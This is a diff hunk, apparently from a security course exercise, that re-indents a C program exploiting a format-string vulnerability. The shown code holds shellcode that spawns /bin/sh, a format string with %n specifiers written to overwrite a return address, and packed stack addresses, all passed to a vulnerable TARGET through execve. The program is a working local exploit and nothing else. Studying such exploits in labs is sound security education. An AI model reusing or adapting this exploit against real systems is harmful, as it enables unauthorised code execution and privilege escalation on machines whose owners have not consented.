@@ -14,18 +14,18 @@ static char shellcode[] =
   "\x80\xe8\xdc\xff\xff\xff/bin/sh";
 
 int main(void) {
-	char *args[5];
+  char *args[5];
 
   // 0xffbfde3c
-	args[0] = "%134u%245$n%57u%246$n%224u%247$n%64u%248$n";
+  args[0] = "%134u%245$n%57u%246$n%224u%247$n%64u%248$n";
   args[1] = "-v";
   // 0xffbfdfa6
   args[2] = shellcode;
   args[3] = "\x3c\xde\xbf\xff\x3d\xde\xbf\xff\x3e\xde\xbf\xff\x3f\xde\xbf\xff.";
-	args[4] = NULL;
+  args[4] = NULL;
 
-	execve(TARGET, args, NULL);
-	// execve only returns if it fails
-	fprintf(stderr, "execve failed\n");
-	return 1;
+  execve(TARGET, args, NULL);
+  // execve only returns if it fails
+  fprintf(stderr, "execve failed\n");
+  return 1;
 }
